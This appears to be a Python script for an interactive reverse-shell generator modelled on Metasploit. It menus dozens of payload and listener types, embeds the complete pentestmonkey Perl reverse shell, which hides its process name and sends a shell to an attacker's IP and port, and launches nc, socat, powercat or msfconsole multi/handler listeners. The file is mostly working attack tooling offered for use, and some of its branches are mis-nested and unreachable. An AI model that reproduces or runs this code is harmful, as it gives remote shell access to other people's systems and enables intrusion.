import os 
import sys 
from time import sleep
import time 
def attack():
    payload = "[+] <reverseshell/Perl>\n"
def options():
    print("""
+==========================================+
               *(options)*

    LHOST = NONE                no

    LPORT = NONE                no

    Listener = NONE             no
+==========================================+
 """)
def msfvenom():
        print("""
--------------------------------------------
             ___                       
  __ _  ___ / _/  _____ ___  ___  __ _ 
 /  ' \(_-</ _/ |/ / -_) _ \/ _ \/  ' \
/_/_/_/___/_/ |___/\__/_//_/\___/_/_/_/
                                       

1# Windows/Meterpreter/Staged/Reverse/TCP/x64
2# Windows/Meterpreter/Staged/Reverse/TCP/x32
3# Windows/Meterpreter/Stageless/Reverse/TCP/x64
4# Windows/Meterpreter/Stageless/Reverse/TCP/x32
5# Windows/Staged/Reverse/TCP/x64
6# Windows/Staged/Reverse/TCP/x32
7# Windows/Stageless/Reverse/TCP/x64
8# Windows/Stageless/Reverse/TCP/x32
9# Linux/Meterpreter/Staged/Reverse/TCP/x64
10# Linux/Meterpreter/Staged/Reverse/TCP/x86
11# Linux/Stageless/Reverse/TCP/x64
12# Linux/Stageless/Reverse/TCP/x86
13# Windows/Bind/TCP/ShellCode/BOF
14# macOS/Meterpreter/Staged/Reverse/TCP/x64
15# macOS/Meterpreter/Stageless/Reverse/TCP/x64
16# macOS/Stageless/Reverse/TCP/x64
17# PHP/Meterpreter/Stageless/Reverse/TCP
18# PHP/Reverse/PHP 
19# JSP/Stageless/Reverse/TCP
20# WAR/Stageless/Reverse/TCP
21# Android/Meterpreter/Reverse/TCP
22# Android/Meterpreter/Embed/Reverse/TCP
23# Python/Stageless/Reverse/TCP
24# Bash/Stageless/Reverse/TCP
--------------------------------------------
  """)
def shells():
    print("""
--------------------------------------------
       __       ____  
  ___ / /  ___ / / /__
 (_-</ _ \/ -_) / (_-<
/___/_//_/\__/_/_/___/

1# Shell/sh
2# Shell/bin/sh
3# Shell/bash
4# Shell/bin/bash
5# Shell/cmd
6# Shell/powershell
7# Shell/pwsh
8# Shell/pwsh
9# Shell/ash
10# Shell/bsh
11# Shell/csh
12# Shell/ksh
13# Shell/zsh
14# Shell/pdksh
15# Shell/tcsh
--------------------------------------------
    """)
def options2():
    print(f"""
+==========================================+
               *(options)*

    LHOST = {LHOST}            yes

    LPORT = {LPORT}            yes

    Listener = {Listener}      yes
+==========================================+
 """)
def helpbanner():
    print(f"""
 -------------------------------------
|  help ==> help banner               |                    
|  exit -y ==> exit the exploit       |
|  back ==> to go back to tool        |
|  list ==> to get reversesshells list |
|  set ==> to set the options         |  
|  list2 ==> to show Listenershells   | 
|  start ==> to start the shell       |
 ------------------------------------  
""")
def reverseshell_list():
    print("""
--------------------------------------------
                                       __       ____
  _______ _  _____ _______ ___    ___ / /  ___ / / /
 / __/ -_) |/ / -_) __(_-</ -_)  (_-</ _ \/ -_) / / 
/_/  \__/|___/\__/_/ /___/\__/__/___/_//_/\__/_/_/  
                            /___/                   
1# reverseshell/Perl
2# reverseshell/Perl/no_sh
3# reverseshell/Perl/PentestMonkey
4# reverseshell/PHP/Emoji
5# reverseshell/PHP/PentestMonkey
6# reverseshell/PHP/Ivan/Sincek
7# reverseshell/PHP/cmd
8# reverseshell/PHP/exec
9# reverseshell/PHP/shell_exec
10# reverseshell/PHP/system
11# reverseshell/PHP/passthru
12# reverseshell/PHP `
13# reverseshell/PHP/popen
14# reverseshell/PHP/proc/open
15# reverseshell/Windows/ConPty
16# reverseshell/PowerShell_1
17# revseshell/PowerShell_2
18# revseshell/PowerShell_3
19# revseshell/PowerShell/TLS
20# revseshell/PowerShell/Base64
21# revseshell/Python_1
22# revseshell/Python_2
23# revseshell/Python3_1
24# revseshell/Python3_2
25# revseshell/Python3_Windows
26# revseshell/Python3_shortest
27# revseshell/Ruby_1
28# revseshell/Ruby/no_sh
29# revseshell/socat_1
30# revseshell/socat_2
31# revseshell/node.js
32# revseshell/node.js_2
33# revseshell/Java_1
34# revseshell/Java_2
35# revseshell/Java_3
36# revseshell/Javascript
37# revseshell/Groovy
38# revseshell/telnet
39# revseshell/zsh
40# revseshell/Lua_1
41# revseshell/Lua_2
42# revseshell/Golang
43# revseshell/Vlang
44# revseshell/Awk
45# revseshell/Dart
46# revseshell/Bash -i
47# revseshell/Bash/196
48# revseshell/Bash/read_line
49# revseshell/Bash_5
50# revseshell/Bash_udp
51# revseshell/nc_mkfifo
52# revseshell/nc -e
53# revseshell/nc_exe -e 
54# revseshell/nc -c 
55# revseshell/ncat -e 
56# revseshell/ncat_exe -e 
57# revseshell/ncat_udp
58# revseshell/rustcat
59# revseshell/C
60# revseshell/C/Windows
61# revseshell/C#/TCP/Client
62# revseshell/C#/Bash -i
63# revseshell/Haskell_1
--------------------------------------------
    """)
def Listenershell():
    print("""
--------------------------------------------
   __   _     __                        __       ____  
  / /  (_)__ / /____ ___  ___ ____ ___ / /  ___ / / /__
 / /__/ (_-</ __/ -_) _ \/ -_) __/(_-</ _ \/ -_) / (_-<
/____/_/___/\__/\__/_//_/\__/_/__/___/_//_/\__/_/_/___/
                             /___/                     
1# Listener/nc
2# Listener/ncat
3# Listener/ncat/TLS
4# Listener/rlwrap/nc
5# Listener/socat
6# Listener/socat/TTY
7# Listener/powercat
8# Listener/msfconsole
--------------------------------------------
    """)
exin_commands = ["help","exit","","back","exit -y","list","clear","list2","show options","start","set","shellslist"]
Listener_list = ["Listener/nc","Listener/ncat","Listener/ncat/TLS","Listener/rlwrap/nc","Listener/socat","Listener/socat/TTY","Listener/powercat","Listener/msfconsole","nc","ncat","powercat","socat","socat/TTY","msfconsole","nc/TLS","rlwrap/nc"]
while True:  
    try:
        exin = input("\033[1;32msmf \033[1;34m(\033[1;31mreverseshell/Perl/PentestMonkey\033[1;34m)> \033[1;32m")
        if exin in exin_commands:
                pass
        if exin not in exin_commands:
            print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {exin}")
            pass
        elif exin == "help":
                helpbanner()   
                pass
        elif exin == "exit":
                    print("[+] please type exit -y to go out the tool")
                    pass
        elif exin == "exit -y":
                            print("bye ! ")
                            os.system("""python3 -c 'import pty;pty.spawn("/bin/bash")'""")    
        elif exin == "clear":
                    os.system("clear")    
                    pass
        elif exin == "list":
                reverseshell_list()
                pass
        elif exin == "list2":
            Listenershell()
            pass
        elif exin == "back":
                os.system("python3 /etc/reverseshells/reverseshell.py")
        elif exin == "show options":
                    options()
                    pass
        elif exin == "shellslist":
            shells()
            pass
        elif exin == "start":
            print("please set first:")
            pass
        elif exin == "set":
            LHOST = input("set your local host: ")
        while LHOST == "":
                        time.sleep(0.5)
                        print("please type LHOST")
                        LHOST = input("set your local host: ")
    #+
        LPORT = input("set your local port: ")
        while LPORT == "":
                        time.sleep(0.5)
                        print("please type LPORT")
                        LPORT = input("set your local port: ")
    #+
        Listener = input("set Listener shell: ")
        while Listener == "":
                        time.sleep(0.5)
                        print("please type Listener shell")
                        Listener = input("set Listener shell: ")
        if Listener not in Listener_list:
                    print("type any of this")
                    time.sleep(1.4)
                    Listenershell()
                    Listener = input("set Listener shell: ")
        if Listener in Listener_list:
                print("done !")
                time.sleep(0.3)
                break
    except:
        attack()
exin2_commands = ["help","exit","","back","exit -y","list","clear","list2","show options","start","reset","shellslist"]
while True:
                    exin2 = input("\033[1;32msmf \033[1;31m(\033[1;34mreverseshell/Perl/PentestMonkey\033[1;31m)> \033[1;32m")
                    if exin2 not in exin2_commands:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {exin}")
                        pass
                        if exin2 in exin2_commands:
                            pass
                    elif exin2 == "back":
                        os.system("python3 /etc/reverseshells/reverseshell.py")
                    elif exin2 == "show options":
                                    options2()
                                    pass
                    elif exin2 == "list":
                                reverseshell_list()
                                pass
                    elif exin2 == "list2":
                            Listenershell()
                            pass
                    elif exin2 == "exit":
                        print("please type exit -y to get out")
                        pass
                    elif exin2 == "exit -y":
                            print("bye ! ")
                            os.system("""python3 -c 'import pty;pty.spawn("/bin/bash")'""")
                    elif exin2 == "reset":
                        attack()
                    elif exin2 == "clear":
                                os.system("clear")
                                pass
                    elif exin2 == "help":
                            helpbanner()
                            pass
                    elif exin2 == "":
                        pass
                    elif exin2 == "start":
                                break
perl_file = """
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to
# you, then do not use this tool.
#
# You are encouraged to send comments, improvements or suggestions to
# me at pentestmonkey@pentestmonkey.net
#
# Description
# -----------
# This script will make an outbound TCP connection to a hardcoded IP and port.
# The recipient will be given a shell running as the current user (apache normally).
#

use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '{}';
my $port = {};

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
		# source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"sh"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
	my $line = shift;
	$line .= "<p>\n";
	$global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
	cgiprintpage();
	exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}
"""
time.sleep(3)
print("this code well saved in folder hackme")
time.sleep(2)
# Show the spinning animation 3 times
print('save  ', end='', flush=True)
for x in range(3):
    for frame in r'-\|/-\|/':
        # Back up one character then print our next frame in the animation
        print('\b', frame, sep='', end='', flush=True)
        sleep(0.2)
print('\b ')
time.sleep(3)
timer2 = time.strftime("%Y-%m-%d %H:%M:%S")
timer = time.strftime("%H:%M:%S")
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mcheck the shell".format(timer,))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mLHOST ==> {}              yes".format(timer,LHOST))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mLPORT ==> {}              yes".format(timer,LPORT))
time.sleep(0.5)
print("\033[1m\033[92m[Success]-[{}]\033[0m \033[1;34mListener ==> {}        yes".format(timer,Listener))
time.sleep(0.5)
print("\033[1m\033[92m[+]-[Shell]\033[0m \033[1;34mthis is your reverseshell with perl")
time.sleep(1)
print(perl_file)
if Listener == "Listener/nc":
        time.sleep(0.5)
        print("starting Listener/nc")
        time.sleep(0.2)
        print("happy hacking :>")
        time.sleep(3)
        print("you are now ready")
        print(f"the session was started in ==> [{timer2}]")
        os.system(f"nc -lvnp {LPORT}")
#######################ncat################ ####################
if Listener == "Listener/ncat":
        time.sleep(0.5)
        print("starting Listener/ncat")
        time.sleep(0.2)
        print("happy hacking :>")
        time.sleep(3)
        print("you are now ready")
        print(f"the session was started in ==> [{timer2}]")
        os.system(f"ncat -lvnp {LPORT}")
#######################ncat_TLS################################
if Listener == "Listener/ncat/TLS":
            time.sleep(0.5)
            print("starting Listener/ncat/TLS")
            time.sleep(0.2)
            print("happy hacking :>")
            time.sleep(3)
            print("you are now ready")
            print(f"the session was started in ==> [{timer2}]")
            os.system(f"ncat --ssl -lvnp {LPORT}")
#######################rlwrap_nc###############################
if Listener == "Listener/rlwrap/nc":
                time.sleep(0.5)
                print("starting Listener/rlwrap/nc")
                time.sleep(0.2)
                print("happy hacking :>")
                time.sleep(3)
                print("you are now ready")
                print(f"the session was started in ==> [{timer2}]")
                os.system(f"rlwrap -cAr nc -lvnp {LPORT}")
#######################socat###################################
if Listener == "Listener/socat":
                    time.sleep(0.5)
                    print("starting Listener/socat")
                    time.sleep(0.2)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    os.system(f"socat -d -d TCP-LISTEN:{LPORT} STDOUT")
#######################socat_TTY###############################
if Listener == "Listener/socat/TTY":
                time.sleep(0.5)
                print("starting Listener/socat/TTY")
                time.sleep(0.2)
                print("happy hacking :>")
                time.sleep(3)
                print("you are now ready")
                print(f"the session was started in ==> [{timer2}]")
                os.system(f"socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{LPORT}")
#######################powercat################################
if Listener == "Listener/powercat":
            time.sleep(0.5)
            print("starting Listener/powercat")
            time.sleep(0.2)
            print("happy hacking :>")
            time.sleep(3)
            print("you are now ready")
            print(f"the session was started in ==> [{timer2}]")
            os.system(f"powercat -l -p {LPORT}")
######################msfconsole###############################
msfconsole_commands = ["windows","linux","php","java","android"]
windows_linux = ["x64","x32"]
if Listener == "Listener/msfconsole":
        time.sleep(0.5)
        print("we have some options for this Listener")
        time.sleep(0.5)
        Listener_options = input("can you set here operating system for multi/handler : ")
        while Listener_options not in msfconsole_commands:
                print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options}")
                Listener_options = input("can you set here operating system for multi/handler : ")
                if Listener_options in msfconsole_commands:
                    print("")
        if Listener_options == "linux":
                print("""
                x64
                x32
                """)
                Listener_options2 = input("what is the bit of linux: ")
                while Listener_options2 not in windows_linux:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options2}")
                        Listener_options2 = input("what is the bit of linux: ")
                        if Listener_options2 in windows_linux:
                            print("")  
                if Listener_options2 == "x64":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_lin = "msfconsole -q -x "f"'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_lin)
                if Listener_options2 == "x32":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_lin_2 = "msfconsole -q -x "f"'use multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_lin_2)
        if Listener_options == "windows":
                print("""
                x64
                x32
                """)
                Listener_options2 = input("what is the bit of windows: ")
                while Listener_options2 not in windows_linux:
                        print(f"\033[1;31m[\033[1;31m-\033[1;31m] \033[1;32mUnknown command: {Listener_options2}")
                        Listener_options2 = input("what is the bit of windows: ")
                        if Listener_options2 in windows_linux:
                            print("")  
                if Listener_options2 == "x64":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_win = "msfconsole -q -x "f"'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_win)
                if Listener_options2 == "x32":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_win_2 = "msfconsole -q -x "f"'use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_win_2)
                if Listener_options == "php":
                    time.sleep(0.5)
                    print("okay !")
                    time.sleep(0.5)
                    print("starting Listener/msfconsole")
                    time.sleep(0.3)
                    print("happy hacking :>")
                    time.sleep(3)
                    print("you are now ready")
                    print(f"the session was started in ==> [{timer2}]")
                    msfconsole_php = "msfconsole -q -x "f"'use multi/handler; set payload php/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                    os.system(msfconsole_php)
                    if Listener_options == "java":
                        time.sleep(0.5)
                        print("okay !")
                        time.sleep(0.5)
                        print("starting Listener/msfconsole")
                        time.sleep(0.3)
                        print("happy hacking :>")
                        time.sleep(3)
                        print("you are now ready")
                        print(f"the session was started in ==> [{timer2}]")
                        msfconsole_java = "msfconsole -q -x "f"'use multi/handler; set payload java/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                        os.system(msfconsole_java)
                        if Listener_options == "android":
                            time.sleep(0.5)
                            print("okay !")
                            time.sleep(0.5)
                            print("starting Listener/msfconsole")
                            time.sleep(0.3)
                            print("happy hacking :>")
                            time.sleep(3)
                            print("you are now ready")
                            print(f"the session was started in ==> [{timer2}]")
                            msfconsole_android = "msfconsole -q -x "f"'use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost {LHOST}; set lport {LPORT}; exploit'"
                            os.system(msfconsole_android)
